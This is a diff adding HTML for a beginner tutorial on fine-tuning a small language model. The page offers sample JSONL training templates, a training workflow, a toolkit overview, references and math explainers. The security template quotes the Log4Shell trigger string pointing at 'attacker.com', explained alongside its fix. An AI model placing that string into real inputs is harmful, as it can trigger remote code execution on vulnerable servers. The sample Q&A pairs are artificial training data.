+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">Escape newlines properly (<code class="text-xs">\n</code>) — invalid JSON will silently skip lines. Use the same code-fence style (<code class="text-xs">```python</code>) everywhere.</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Bonus tip</div>
+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">Include a couple "explain this" examples too — not just code generation. Helps the model talk about code, not just write it.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Template 2: Security / Network -->
+    <div class="mt-12">
+      <div class="flex items-baseline gap-3 mb-3">
+        <div class="w-10 h-10 bg-ibm-blue-60 text-white flex items-center justify-center font-mono font-bold">B</div>
+        <h3 class="font-serif font-bold text-2xl">Template B — Security &amp; network knowledge</h3>
+      </div>
+      <p class="text-ibm-gray-70 dark:text-ibm-gray-30 mb-4 max-w-3xl">For a security/networking helper. Ports, protocols, CVEs, common attacks, headers — concise, accurate, citable.</p>
+
+      <div class="relative">
+        <pre id="security-template" class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-5 text-xs overflow-x-auto"><code>{"messages":[{"role":"user","content":"What's the default port for SSH?"},{"role":"assistant","content":"SSH uses TCP port 22 by default, assigned by IANA. Many admins move it to a non-standard port to reduce noisy scans — that's security through obscurity, not real protection. Real protection comes from key-based auth and disabling password login."}]}
+{"messages":[{"role":"user","content":"What is CVE-2021-44228?"},{"role":"assistant","content":"Log4Shell — a critical remote code execution flaw in Apache Log4j 2 (versions &lt; 2.17.0). Attackers can trigger it by getting a vulnerable app to log a crafted string like ${jndi:ldap://attacker.com/x}. CVSS score: 10.0. Fix: upgrade Log4j; if you can't, set log4j2.formatMsgNoLookups=true."}]}
+{"messages":[{"role":"user","content":"Explain the X-Frame-Options HTTP header."},{"role":"assistant","content":"X-Frame-Options tells browsers whether your page can be embedded in an &lt;iframe&gt; on other sites. Values: DENY (never), SAMEORIGIN (only your own site), or ALLOW-FROM uri (deprecated). It prevents clickjacking. Modern alternative: Content-Security-Policy frame-ancestors directive, which is more flexible."}]}
+{"messages":[{"role":"user","content":"What does a SYN flood attack do?"},{"role":"assistant","content":"It exploits the TCP 3-way handshake. The attacker sends many SYN packets but never replies to the SYN-ACK. The target's connection table fills with half-open connections, eventually refusing legitimate traffic. Mitigations: SYN cookies (defer state allocation until ACK arrives), connection rate limits, and proper firewall rules."}]}</code></pre>
+        <button class="copy-btn absolute top-3 right-3 text-xs font-mono px-2 py-1 bg-ibm-gray-10 dark:bg-ibm-gray-80 text-ibm-blue-60 dark:text-ibm-blue-40 border border-ibm-gray-30 dark:border-ibm-gray-70" data-copy-target="security-template">copy</button>
+      </div>
+
+      <div class="mt-4 grid sm:grid-cols-3 gap-3 text-sm">
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Where to find data</div>
+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">NIST NVD (CVE database), MITRE ATT&amp;CK, RFC documents, OWASP cheat sheets. All free and authoritative.</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Pitfalls</div>
+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">Accuracy matters more here than anywhere — wrong CVE details could mislead someone in a real incident. Verify every answer.</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Bonus tip</div>
+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">Add a system-prompt rule: "If you're not sure, say so." Small models will confidently invent CVEs otherwise.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Template 3: Logs -->
+    <div class="mt-12">
+      <div class="flex items-baseline gap-3 mb-3">
+        <div class="w-10 h-10 bg-ibm-blue-60 text-white flex items-center justify-center font-mono font-bold">C</div>
+        <h3 class="font-serif font-bold text-2xl">Template C — Log file interpretation</h3>
+      </div>
+      <p class="text-ibm-gray-70 dark:text-ibm-gray-30 mb-4 max-w-3xl">For a log-whisperer. Paste an obscure log line, get a plain-English explanation and likely causes.</p>
+
+      <div class="relative">
+        <pre id="logs-template" class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-5 text-xs overflow-x-auto"><code>{"messages":[{"role":"user","content":"What does this mean?\n2024-03-15 14:22:01 ERROR [pool-1-thread-3] com.app.UserService - Failed to authenticate user: java.sql.SQLException: Connection timeout after 30000ms"},{"role":"assistant","content":"A Java app (UserService) tried to look up a user in a database to authenticate them, but the database query timed out after 30 seconds. Most likely causes:\n\n1. The database is down or unreachable.\n2. Connection pool exhausted — all connections in use.\n3. A slow query is holding locks.\n4. Network issue between app and DB.\n\nCheck DB status first, then connection pool metrics, then query logs."}]}
+{"messages":[{"role":"user","content":"Nginx log: 192.168.1.5 - - [12/Mar/2024:10:14:33 +0000] \"GET /api/users HTTP/1.1\" 404 312 \"-\" \"curl/7.81.0\""},{"role":"assistant","content":"An Nginx access log entry. Breaking it down:\n• 192.168.1.5 — client IP\n• 12/Mar/2024:10:14:33 — timestamp\n• GET /api/users — request method + path\n• 404 — status code: resource not found\n• 312 — bytes sent in response body\n• curl/7.81.0 — User-Agent (someone using curl, not a browser)\n\nThe 404 means /api/users doesn't exist on this server. Check your route config or if the request should go to a different upstream."}]}
+{"messages":[{"role":"user","content":"systemd: 'sshd.service: Main process exited, code=killed, status=9/KILL'"},{"role":"assistant","content":"The SSH daemon (sshd) was killed by signal 9 (SIGKILL). Signal 9 is uncatchable — something forcibly terminated it. Common causes:\n\n1. The OOM killer ran out of memory and killed sshd.\n2. Someone ran `kill -9` manually.\n3. A misbehaving init script.\n\nCheck `dmesg | grep -i oom` for memory pressure, and `journalctl _COMM=systemd` around the timestamp for context."}]}</code></pre>
+        <button class="copy-btn absolute top-3 right-3 text-xs font-mono px-2 py-1 bg-ibm-gray-10 dark:bg-ibm-gray-80 text-ibm-blue-60 dark:text-ibm-blue-40 border border-ibm-gray-30 dark:border-ibm-gray-70" data-copy-target="logs-template">copy</button>
+      </div>
+
+      <div class="mt-4 grid sm:grid-cols-3 gap-3 text-sm">
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Where to find data</div>
+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">Your own logs (redact PII!) — nginx, syslog, application logs. Public dataset: <a href="https://github.com/logpai/loghub" target="_blank" rel="noopener" class="text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">LogHub</a> has labeled samples.</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Pitfalls</div>
+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">Strip secrets, IPs, usernames, real CVE IDs from your own logs before training. Models can leak training data verbatim.</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Bonus tip</div>
+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">Cover multiple log formats — nginx, systemd, JSON-structured logs, stack traces. Each looks different.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- The workflow -->
+    <div class="mt-12 bg-ibm-blue-60 text-white p-6 sm:p-8">
+      <h3 class="font-serif font-bold text-2xl mb-4">The 5-step workflow for your own dataset</h3>
+      <ol class="space-y-3 text-base sm:text-lg leading-relaxed">
+        <li class="flex gap-3"><span class="font-mono opacity-70 shrink-0">01</span>Write 50–100 example Q&amp;A pairs in JSONL using one of the templates above.</li>
+        <li class="flex gap-3"><span class="font-mono opacity-70 shrink-0">02</span>Save as <code class="bg-white/20 px-1.5 py-0.5 text-sm rounded">data/dataset.jsonl</code> (overwrite the grocery one).</li>
+        <li class="flex gap-3"><span class="font-mono opacity-70 shrink-0">03</span>Optionally rewrite the <code class="bg-white/20 px-1.5 py-0.5 text-sm rounded">SYSTEM</code> line in <code class="bg-white/20 px-1.5 py-0.5 text-sm rounded">Modelfile</code> to match the new persona.</li>
+        <li class="flex gap-3"><span class="font-mono opacity-70 shrink-0">04</span>Run <code class="bg-white/20 px-1.5 py-0.5 text-sm rounded">docker compose --profile train run --rm trainer</code> — takes 5–15 min on CPU.</li>
+        <li class="flex gap-3"><span class="font-mono opacity-70 shrink-0">05</span><code class="bg-white/20 px-1.5 py-0.5 text-sm rounded">docker compose restart ollama-init</code> and try your new model.</li>
+      </ol>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §11 THE TOOLKIT ====================== -->
+<section id="tools" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 11</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">The toolkit — every piece, what it does.</h2>
+
+    <div class="mt-10 grid lg:grid-cols-12 gap-8">
+
+      <!-- stack diagram -->
+      <div class="lg:col-span-5">
+        <svg class="diagram" viewBox="0 0 400 460" xmlns="http://www.w3.org/2000/svg">
+          <text x="200" y="25" text-anchor="middle" font-size="13" font-weight="600" class="fill-fg">The Stack</text>
+
+          <g font-family="IBM Plex Sans">
+            <!-- layers from bottom to top -->
+            <rect x="40" y="400" width="320" height="40" class="fill-card stroke-fg" stroke-width="1.5"/>
+            <text x="200" y="424" text-anchor="middle" font-size="14" font-weight="500" class="fill-fg">CPU (your laptop)</text>
+
+            <rect x="40" y="350" width="320" height="40" class="fill-blue-soft stroke-blue" stroke-width="1.5"/>
+            <text x="200" y="374" text-anchor="middle" font-size="14" font-weight="600" class="fill-fg">PyTorch</text>
+            <text x="365" y="374" text-anchor="end" font-size="10" font-family="IBM Plex Mono" class="muted-text"></text>
+
+            <rect x="40" y="300" width="320" height="40" class="fill-blue-soft stroke-blue" stroke-width="1.5"/>
+            <text x="200" y="324" text-anchor="middle" font-size="14" font-weight="600" class="fill-fg">Transformers (Hugging Face)</text>
+
+            <rect x="40" y="250" width="320" height="40" class="fill-blue-soft stroke-blue" stroke-width="1.5"/>
+            <text x="200" y="274" text-anchor="middle" font-size="14" font-weight="600" class="fill-fg">PEFT (LoRA)</text>
+
+            <rect x="40" y="200" width="320" height="40" class="fill-blue-soft stroke-blue" stroke-width="1.5"/>
+            <text x="200" y="224" text-anchor="middle" font-size="14" font-weight="600" class="fill-fg">llama.cpp (GGUF conversion)</text>
+
+            <rect x="40" y="150" width="320" height="40" class="fill-blue-soft stroke-blue" stroke-width="1.5"/>
+            <text x="200" y="174" text-anchor="middle" font-size="14" font-weight="600" class="fill-fg">Ollama (the server)</text>
+
+            <rect x="40" y="100" width="320" height="40" class="fill-blue-soft stroke-blue" stroke-width="1.5"/>
+            <text x="200" y="124" text-anchor="middle" font-size="14" font-weight="600" class="fill-fg">Nginx (proxy + static files)</text>
+
+            <rect x="40" y="50" width="320" height="40" class="fill-blue stroke-fg" stroke-width="1.5"/>
+            <text x="200" y="74" text-anchor="middle" font-size="14" font-weight="600" fill="white">Your browser → the chat UI</text>
+          </g>
+        </svg>
+      </div>
+
+      <!-- tool list -->
+      <div class="lg:col-span-7 space-y-4">
+
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-5">
+          <div class="flex items-baseline justify-between gap-4">
+            <h4 class="font-serif font-bold text-lg">PyTorch</h4>
+            <a href="https://pytorch.org" target="_blank" rel="noopener" class="text-xs text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">pytorch.org ↗</a>
+          </div>
+          <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">The math engine. Defines the tensors, runs the forward + backward pass, and lets PEFT bolt LoRA onto the model.</p>
+        </div>
+
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-5">
+          <div class="flex items-baseline justify-between gap-4">
+            <h4 class="font-serif font-bold text-lg">Hugging Face Transformers</h4>
+            <a href="https://huggingface.co/docs/transformers" target="_blank" rel="noopener" class="text-xs text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">docs ↗</a>
+          </div>
+          <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">A library that wraps PyTorch with model-specific knowledge. Knows the architecture of SmolLM2 (and dozens of others), how to tokenize for it, and how to load weights from the Hugging Face Hub.</p>
+        </div>
+
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-5">
+          <div class="flex items-baseline justify-between gap-4">
+            <h4 class="font-serif font-bold text-lg">PEFT</h4>
+            <a href="https://huggingface.co/docs/peft" target="_blank" rel="noopener" class="text-xs text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">docs ↗</a>
+          </div>
+          <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">"Parameter Efficient Fine-Tuning." Implements LoRA. About 50 lines of config and PyTorch knows to freeze the base and add tiny trainable adapters.</p>
+        </div>
+
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-5">
+          <div class="flex items-baseline justify-between gap-4">
+            <h4 class="font-serif font-bold text-lg">llama.cpp</h4>
+            <a href="https://github.com/ggml-org/llama.cpp" target="_blank" rel="noopener" class="text-xs text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">github ↗</a>
+          </div>
+          <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">The legendary open-source project that started CPU inference of LLMs. We use its Python converter to turn PyTorch weights into a single GGUF file.</p>
+        </div>
+
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-5">
+          <div class="flex items-baseline justify-between gap-4">
+            <h4 class="font-serif font-bold text-lg">Ollama</h4>
+            <a href="https://ollama.com" target="_blank" rel="noopener" class="text-xs text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">ollama.com ↗</a>
+          </div>
+          <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">The "Docker for LLMs." Loads GGUF files, manages models, and serves a simple HTTP API for chat. Auto-detects whether to use GPU or CPU.</p>
+        </div>
+
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-5">
+          <div class="flex items-baseline justify-between gap-4">
+            <h4 class="font-serif font-bold text-lg">Docker + Compose</h4>
+            <a href="https://docs.docker.com/compose/" target="_blank" rel="noopener" class="text-xs text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">docs ↗</a>
+          </div>
+          <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">Packages every service (trainer, ollama, init, web UI) into containers so it runs the same on any computer. <code class="text-xs">docker compose up</code> brings the whole stack online.</p>
+        </div>
+
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-5">
+          <div class="flex items-baseline justify-between gap-4">
+            <h4 class="font-serif font-bold text-lg">Nginx</h4>
+            <a href="https://nginx.org" target="_blank" rel="noopener" class="text-xs text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">nginx.org ↗</a>
+          </div>
+          <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">A web server. We use it for two things: serving the HTML chat page and proxying API requests to Ollama (avoids CORS pain).</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §12 REFERENCES ====================== -->
+<section id="refs" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80 bg-ibm-gray-10/50 dark:bg-ibm-gray-90/50">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 12</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">Keep learning.</h2>
+    <p class="mt-3 max-w-3xl text-ibm-gray-70 dark:text-ibm-gray-30 text-lg">
+      The best free resources to go further. All of these are written by the people who built the things.
+    </p>
+
+    <div class="mt-10 grid md:grid-cols-2 lg:grid-cols-3 gap-4">
+
+      <a href="https://pytorch.org/tutorials/" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">PYTORCH</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">Official PyTorch tutorials</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">Start with "Learn the Basics" — a 60-minute walkthrough.</p>
+      </a>
+
+      <a href="https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">VIDEO · NEURAL NETS</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">3Blue1Brown — Neural networks</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">The most beautiful visual explanations of backpropagation and how networks work. Truly accessible.</p>
+      </a>
+
+      <a href="https://www.youtube.com/watch?v=zjkBMFhNj_g" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">VIDEO · GPT</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">Karpathy — Build GPT from scratch</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">2-hour video where Andrej Karpathy codes a tiny language model live. Worth every minute.</p>
+      </a>
+
+      <a href="https://huggingface.co/docs/transformers/index" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">HUGGING FACE</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">Transformers docs</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">The library we use for loading and training. The "Pipelines" section is the easiest entry point.</p>
+      </a>
+
+      <a href="https://huggingface.co/docs/peft/index" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">HUGGING FACE</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">PEFT (LoRA) docs</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">How to fine-tune with adapters. Includes recipes for many model families.</p>
+      </a>
+
+      <a href="https://arxiv.org/abs/2106.09685" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">PAPER</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">LoRA — original paper</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">If you want to see the math. Surprisingly readable; the key idea fits on one page.</p>
+      </a>
+
+      <a href="https://arxiv.org/abs/1706.03762" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">PAPER · CLASSIC</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">Attention is All You Need</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">The 2017 paper that introduced the Transformer architecture — the foundation of GPT, Claude, every modern LLM.</p>
+      </a>
+
+      <a href="https://ollama.com/library" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">OLLAMA</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">Model library</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">Hundreds of pre-made models you can `ollama pull` instantly. Great for experimenting.</p>
+      </a>
+
+      <a href="https://github.com/ollama/ollama/blob/main/docs/api.md" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">OLLAMA</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">HTTP API reference</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">/api/chat, /api/generate, streaming, tools — everything our web UI talks to.</p>
+      </a>
+
+      <a href="https://github.com/karpathy/nanoGPT" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">CODE</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">nanoGPT</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">Karpathy's minimal GPT in ~300 lines of PyTorch. The whole transformer in one readable file.</p>
+      </a>
+
+      <a href="https://huggingface.co/HuggingFaceTB/SmolLM2-135M-Instruct" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">MODEL</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">SmolLM2-135M-Instruct</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">The base model we fine-tune. See its card for benchmarks and training details.</p>
+      </a>
+
+      <a href="https://github.com/ggml-org/ggml/blob/master/docs/gguf.md" target="_blank" rel="noopener" class="block bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-5 hover:border-ibm-blue-60 dark:hover:border-ibm-blue-40 transition group">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-1">FORMAT SPEC</div>
+        <div class="font-semibold group-hover:text-ibm-blue-60 dark:group-hover:text-ibm-blue-40">GGUF format specification</div>
+        <p class="text-sm text-ibm-gray-70 dark:text-ibm-gray-30 mt-1">The exact byte layout of a GGUF file. Useful if you ever need to debug or build tooling.</p>
+      </a>
+    </div>
+  </div>
+</section>
+
+
+<!-- ============================ FOOTER ============================ -->
+<footer class="py-12 bg-ibm-gray-100 text-ibm-gray-10">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6">
+    <div class="flex flex-col sm:flex-row justify-between items-start gap-6">
+      <div>
+        <div class="font-serif text-2xl font-bold">How AI Learns</div>
+        <div class="text-sm text-ibm-gray-30 mt-1">A tutorial for curious minds</div>
+        <div class="text-xs text-ibm-gray-50 mt-3 font-mono">part of the grocery-slm project · CPU-only</div>
+      </div>
+      <nav class="flex flex-col gap-1 text-sm">
+        <a href="/" class="hover:text-ibm-blue-40">→ open the chat</a>
+        <a href="/explainer.html" class="hover:text-ibm-blue-40">→ technical explainer</a>
+        <a href="#top" class="hover:text-ibm-blue-40">↑ back to top</a>
+      </nav>
+    </div>
+  </div>
+</footer>
+
+
+<!-- ============================ MODAL ============================ -->
+<dialog id="modal" class="rounded-none bg-white dark:bg-ibm-gray-100 text-ibm-gray-100 dark:text-ibm-gray-10 max-w-2xl w-[92vw] p-0 border border-ibm-gray-20 dark:border-ibm-gray-80 shadow-2xl">
+  <div class="flex items-center justify-between p-4 border-b border-ibm-gray-20 dark:border-ibm-gray-80 sticky top-0 bg-white dark:bg-ibm-gray-100">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Deeper dive</div>
+    <button id="modal-close" aria-label="Close" class="p-1.5 hover:bg-ibm-gray-10 dark:hover:bg-ibm-gray-90 transition">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
+    </button>
+  </div>
+  <div id="modal-body" class="p-6 prose-tut max-h-[75vh] overflow-y-auto"></div>
+</dialog>
+
+<!-- ====================== MODAL TEMPLATES ====================== -->
+
+<template id="content-pytorch-deep">
+  <h3 class="font-serif font-bold text-2xl mb-3">PyTorch in 10 lines</h3>
+  <p class="mb-4">Here's the famous autograd demo. PyTorch tracks every operation you do on a tensor with <code>requires_grad=True</code> and lets you compute derivatives automatically.</p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm"><code>import torch
+
+# A number we want to find the slope at
+x = torch.tensor([3.0], requires_grad=True)
+
+# A function:  y = x²
+y = x ** 2
+
+# Compute the slope of y with respect to x
+y.backward()
+
+# dy/dx at x=3  →  2x = 6
+print(x.grad)   # tensor([6.])</code></pre>
+  <p class="mt-4">Now imagine instead of one number, <code>x</code> is 135 million weights, and instead of <code>x²</code> it's a whole neural network with 32 layers. Same idea — PyTorch handles all the bookkeeping.</p>
+</template>
+
+<template id="content-neuron-math">
+  <h3 class="font-serif font-bold text-2xl mb-3">One neuron, fully worked</h3>
+  <p class="mb-3">Say a neuron has these settings:</p>
+  <ul class="list-disc pl-6 mb-4 space-y-1">
+    <li>Weights: <code>w₁ = 0.5</code>, <code>w₂ = -0.3</code>, <code>w₃ = 0.8</code></li>
+    <li>Bias: <code>b = 0.1</code></li>
+    <li>Activation: ReLU (<code>max(0, x)</code>)</li>
+  </ul>
+  <p class="mb-3">And these inputs: <code>x₁ = 2, x₂ = 4, x₃ = 1</code></p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm"><code>sum  = 0.5×2 + (-0.3)×4 + 0.8×1 + 0.1
+     = 1.0  +  -1.2  +  0.8  +  0.1
+     = 0.7
+
+output = ReLU(0.7) = max(0, 0.7) = 0.7</code></pre>
+  <p class="mt-4">That's the entire computation in one neuron. A real model just does this for millions of neurons, organized in layers where each layer's outputs feed the next.</p>
+</template>
+
+<template id="content-math-deep">
+  <h3 class="font-serif font-bold text-2xl mb-3">Matrix multiplication</h3>
+  <p class="mb-3">When a whole <em>layer</em> of neurons processes inputs at once, we do it with matrix multiplication. Say 3 inputs going into 2 neurons:</p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm"><code>inputs  = [1, 2, 3]                  (1 × 3 matrix)
+weights = [[0.5, -0.1, 0.2],
+           [0.3,  0.4, 0.7]]          (2 × 3 matrix)
+
+each output = dot product of inputs with one weight row:
+  neuron 1: 1×0.5 + 2×(-0.1) + 3×0.2 =  0.9
+  neuron 2: 1×0.3 + 2×0.4    + 3×0.7 =  3.2</code></pre>
+  <p class="mt-4 mb-3">Big neural networks are stacks of these matrix multiplications, with activation functions in between. GPUs are amazing at matrix multiplication; that's why they took over AI.</p>
+
+  <h3 class="font-serif font-bold text-2xl mb-3 mt-6">Gradient descent in one image</h3>
+  <p class="mb-3">Imagine you're standing on a hill in fog. You can't see the bottom, but you can feel which way is downhill. So you take a small step downhill. Repeat. Eventually you reach a valley.</p>
+  <p class="mb-3">That's it. The "hill" is the loss function. The "downhill direction" is the negative of the gradient. The "step size" is the learning rate. Doing this for every weight in the model — at once, automatically — is what training is.</p>
+</template>
+
+<template id="content-tokenizer-deep">
+  <h3 class="font-serif font-bold text-2xl mb-3">Byte Pair Encoding (BPE)</h3>
+  <p class="mb-4">The tokenizer is built by a process called BPE. It scans a huge pile of text and finds the most common character pairs, merging them into single tokens, then repeats. Over thousands of merge steps you end up with a vocabulary that has common pieces as whole tokens, and rare words as smaller chunks.</p>
+  <p class="mb-3">Examples for SmolLM2's tokenizer (illustrative):</p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm"><code>"the"          → 1 token
+"avocado"      → 1 token
+"GroceryGPT"   → 4 tokens   ("G", "rocery", "GP", "T")
+"floccinaucinihilipilification" → 11 tokens</code></pre>
+  <p class="mt-4">Numbers get tokenized too — usually each digit is its own token. That's why language models are sometimes bad at math involving long numbers.</p>
+</template>
+
+<template id="content-loop-deep">
+  <h3 class="font-serif font-bold text-2xl mb-3">A real training loop in PyTorch</h3>
